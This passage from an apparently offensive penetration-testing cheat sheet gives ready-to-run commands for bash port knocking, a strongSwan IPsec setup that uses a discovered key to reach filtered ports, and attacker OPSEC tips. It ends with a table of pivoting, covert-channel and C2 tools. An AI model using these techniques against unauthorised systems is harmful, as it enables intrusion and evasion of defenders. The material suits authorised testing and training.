> **OPSEC:** Successful knocks are logged in `/var/log/knockd.log` with source IP. The `start_command` typically inserts an `iptables`/`ufw allow from %IP%` rule, so your IP is allowlisted for `cmd_timeout` seconds — visible in `iptables -L INPUT -n` if a defender checks during the window.

#### Living-off-the-land alternative — bash on a pivot with no knock binary
```bash
# Mixed TCP/UDP sequence using only /dev/tcp + /dev/udp
# TCP "knock" via failed connect (SYN sent, RST received — counts as a knock)
for p in 7000 8000; do (timeout 1 bash -c "exec 3<>/dev/tcp/<TARGET>/$p") 2>/dev/null; sleep 0.2; done
# Final UDP knock
echo > /dev/udp/<TARGET>/9000
ssh <USER>@<TARGET>
```

---

## IPSec Transport Tunnel — Host Firewall Bypass (strongSwan)

When `nmap` shows TCP ports as `filtered` and `ike-scan` reveals UDP/500 with a PSK proposal, the host firewall may be enforcing **IPsec policy** — only ESP-encapsulated traffic from an authenticated peer reaches the protected ports. Establish a transport-mode SA with strongSwan and the filtered TCP ports become reachable.

### Recon — confirm IPsec is the gate
```bash
# Discovery already covered in enumeration (UDP 500 / 4500)
sudo ike-scan -M <TARGET>
# Look for: "Main Mode Handshake returned" + a proposal block:
#   Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800
# Map ike-scan output → strongSwan config:
#   Enc=3DES Hash=SHA1 Group=2:modp1024 → ike=3des-sha1-modp1024  esp=3des-sha1

# Confirm TCP filter is policy-based (not RST) — should hang, not refuse
nmap -p- -sT -Pn -T4 <TARGET>
# Expected: "filtered" on the protected ports until the SA is up
```

### Tool install
```bash
sudo apt install -y strongswan strongswan-pki
```

### Configure PSK
```bash
# /etc/ipsec.secrets — format: <SRC> <DST> : PSK "<KEY>"
# Empty SRC = us. Quote the key.
echo ': PSK "<PASSWORD>"' | sudo tee -a /etc/ipsec.secrets
sudo chmod 600 /etc/ipsec.secrets
```

### Define the connection
```bash
# /etc/ipsec.conf — transport mode against a single host, IKEv1 + PSK
# esp= and ike= MUST match the proposal from ike-scan exactly
sudo tee -a /etc/ipsec.conf <<'EOF'
conn target
    type=transport
    keyexchange=ikev1
    authby=psk
    left=%defaultroute
    leftid=<ATTACKER_IP>
    right=<TARGET>
    rightid=<TARGET>
    rightprotoport=tcp
    leftprotoport=tcp
    ike=3des-sha1-modp1024
    esp=3des-sha1
    auto=start
EOF
```

### Bring the SA up + debug
```bash
sudo ipsec stop
sudo ipsec start --nofork
# Watch for: "CHILD_SA target{1} established" / "connection 'target' established successfully"
# Ctrl-C and detach once established, or run as service:
sudo ipsec restart
```

### Validate state
```bash
# Connection summary
sudo ipsec status
sudo ipsec statusall

# Kernel SA + policy (the actual XFRM state)
sudo ip xfrm state
sudo ip xfrm policy
# You want: src <ATTACKER_IP> dst <TARGET> proto esp spi 0x... + matching policies in/out
```

### Re-scan target through the SA
```bash
# CRITICAL: use -sT (TCP connect). SYN-only scans bypass the kernel's IPsec
# policy attachment and arrive at the target unencrypted → still filtered.
ports=$(sudo nmap -p- --min-rate=1000 -sT -T4 -Pn <TARGET> -oG - | awk '/Ports:/{print $0}' | grep -oE '[0-9]+/open' | cut -d/ -f1 | paste -sd,)
sudo nmap -sC -sV -sT -Pn -p"$ports" <TARGET>
# Ports that were "filtered" pre-tunnel are now reachable
```

### Teardown
```bash
sudo ipsec down target
sudo ipsec stop
# Optional cleanup
sudo sed -i '/^conn target$/,/^$/d' /etc/ipsec.conf
sudo sed -i '/PSK "<PASSWORD>"/d' /etc/ipsec.secrets
```

> **Tip:** If `type=transport` + `rightprotoport=tcp` fails to establish, retry without protoports (tunnel mode default), or swap `rightprotoport=udp`. The `esp=` / `ike=` strings MUST match the responder's accepted proposal — copy from `ike-scan` (`Enc=3DES Hash=SHA1 Group=2:modp1024` → `esp=3des-sha1`, `ike=3des-sha1-modp1024`).

> **OPSEC:** strongSwan binds UDP/500 + UDP/4500 on all interfaces by default. On multi-homed boxes set `leftaddr=<ATTACKER_IP>` in the `conn` block to avoid leaking IKE to other networks.

> **LOTL caveat:** `nmap -sS` (default SYN scan) and other raw-socket tools skip the kernel's IPsec policy lookup — they emit unencrypted packets and report `filtered`. Always use `-sT` (TCP connect via libc) or proxychains-style userspace clients through the tunnel.

[Back to top](#table-of-contents)

---

## Quick Decision Guide

| Scenario | Best Tool | Why |
|---|---|---|
| **Full subnet access, tools work natively** | Ligolo-ng | Route-based, no SOCKS overhead |
| **Meterpreter session already active** | Metasploit route + socks_proxy | No extra binary; reuses existing session |
| **Single port to internal service** | Meterpreter `portfwd` or SSH `-L` | Simple, no extra tools |
| **Quick single-port forward** | SSH `-L` | Simple, no extra tools |
| **SOCKS proxy needed** | SSH `-D` or Chisel | Flexible, tools via proxychains |
| **Restrictive firewall (only HTTP out)** | Chisel | HTTP-based tunnel |
| **Only an existing webshell, no binary upload** | reGeorg / Neo-reGeorg / pivotnacci | SOCKS over HTTP through the webshell |
| **Only DNS allowed outbound** | dnscat2 | DNS-based covert channel |
| **Only ICMP allowed outbound** | ptunnel-ng / icmpsh | ICMP-encapsulated tunnel |
| **VPN-like access, simple setup** | sshuttle | Transparent routing |
| **Windows pivot, no SSH** | Chisel or netsh | Native Windows or portable binary |
| **Relay reverse shell** | Socat | Lightweight, quick setup |
| **Multi-hop / deep pivot** | Ligolo-ng or Sliver | Clean multi-hop support |
| **C2 with encrypted tunnel** | Sliver (mTLS/WG) | Built-in SOCKS5, pivot listeners, encrypted |
| **Team operation / GUI needed** | Havoc | Cobalt Strike-like UI, shared sessions |
| **UDP services needed (SNMP, DNS, NTP)** | Ligolo-ng or socat UDP relay | SOCKS/proxychains silently drops UDP; must use route-based or per-port relay |
| **TCP filtered by IPSec policy (IKE on 500)** | strongSwan transport-mode SA | Establish SA with discovered PSK → ports become reachable |

[Back to top](#table-of-contents)
